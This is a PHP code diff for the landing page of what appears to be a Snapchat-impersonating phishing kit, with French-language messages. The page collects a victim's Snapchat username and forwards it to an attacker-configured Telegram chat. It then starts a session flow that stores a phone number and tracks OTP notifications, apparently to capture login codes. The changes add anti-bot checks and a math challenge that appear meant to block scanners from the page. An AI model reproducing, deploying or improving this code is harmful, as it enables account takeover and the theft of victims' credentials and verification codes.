@@ -3,39 +3,56 @@
 declare(strict_types=1);
 
 require __DIR__ . '/includes/bootstrap.php';
+require __DIR__ . '/includes/antibot.php';
 
 session_start();
 
 $error = '';
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $pseudo = isset($_POST['pseudo']) ? trim((string) $_POST['pseudo']) : '';
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    app_regenerate_math_challenge();
+    app_touch_form_opened('index');
+}
 
-    if ($pseudo === '') {
-        $error = 'Veuillez entrer votre nom d\'utilisateur Snapchat.';
-    } elseif (!app_telegram_configured()) {
-        $error = 'Configuration Telegram incomplète : renseignez le token et le chat ID dans config.php.';
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $ab = app_antibot_verify_post('index', 2.0);
+    if ($ab !== '') {
+        $error = $ab;
+        app_regenerate_math_challenge();
     } else {
-        $text = 'Nouveau pseudo Snapchat : ' . $pseudo;
-        $r = app_telegram_send([
-            'chat_id' => $config['telegram_chat_id'],
-            'text' => $text,
-        ]);
-        if (!$r['ok']) {
-            $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
+        $pseudo = isset($_POST['pseudo']) ? trim((string) $_POST['pseudo']) : '';
+
+        if ($pseudo === '') {
+            $error = 'Veuillez entrer votre nom d\'utilisateur Snapchat.';
+            app_regenerate_math_challenge();
+        } elseif (!app_telegram_configured()) {
+            $error = 'Configuration Telegram incomplète : renseignez le token et le chat ID dans config.php.';
+            app_regenerate_math_challenge();
         } else {
-            $flowId = app_new_flow_id();
-            $secret = app_new_secret();
-            app_flow_write($flowId, [
-                'pseudo' => $pseudo,
-                'secret' => $secret,
-                'phone' => null,
-                'created' => time(),
+            $text = 'Nouveau pseudo Snapchat : ' . $pseudo;
+            $r = app_telegram_send([
+                'chat_id' => $config['telegram_chat_id'],
+                'text' => $text,
             ]);
-            $_SESSION['flow_id'] = $flowId;
-            $_SESSION['flow_secret'] = $secret;
-            header('Location: confirm.php', true, 302);
-            exit;
+            if (!$r['ok']) {
+                $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
+                app_regenerate_math_challenge();
+            } else {
+                $flowId = app_new_flow_id();
+                $secret = app_new_secret();
+                app_flow_write($flowId, [
+                    'pseudo' => $pseudo,
+                    'secret' => $secret,
+                    'phone' => null,
+                    'created' => time(),
+                    'otp_notified_4' => 0,
+                    'otp_notified_6' => 0,
+                ]);
+                $_SESSION['flow_id'] = $flowId;
+                $_SESSION['flow_secret'] = $secret;
+                header('Location: confirm.php', true, 302);
+                exit;
+            }
         }
     }
 }
@@ -66,6 +83,7 @@ $css = require __DIR__ . '/includes/snap_styles.php';
         <?php endif; ?>
 
         <form method="post" action="">
+            <?php require __DIR__ . '/includes/form_antibot_fields.php'; ?>
             <label for="pseudo">Nom d'utilisateur</label>
             <input
                 type="text"
